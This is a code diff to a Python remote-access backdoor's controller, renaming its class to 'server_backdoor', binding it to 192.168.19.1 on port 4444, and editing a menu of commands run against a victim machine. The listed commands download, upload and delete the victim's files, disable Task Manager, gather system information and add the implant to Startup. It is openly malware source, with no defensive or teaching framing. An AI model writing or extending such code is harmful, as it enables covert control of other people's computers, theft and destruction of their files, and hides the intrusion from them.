@@ -4,7 +4,7 @@ import socket
 import base64
 import datetime
  
-class Listener:
+class server_backdoor:
     def __init__(self, ip, port):
         listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -65,7 +65,8 @@ class Listener:
         print("\nH/help: Help menu")
         print("D path: Download a file.")
         print("U path: Upload a file.")
-        print("S: Take a Screenshot.")                
+        print("del path: Delete the File/Folder specified.")
+        #print("S: Take a Screenshot.") Under Maintaince                
         print("TM: Enable/Disable Task Manager.")
         print("SI: Get System information")
         print("ST: Add to Startup.")
@@ -100,5 +101,5 @@ class Listener:
  
             print(result)
  
-my_listener = Listener("192.168.19.1", 4444)
-my_listener.run()
+server = server_backdoor("192.168.19.1", 4444)
+server.run()
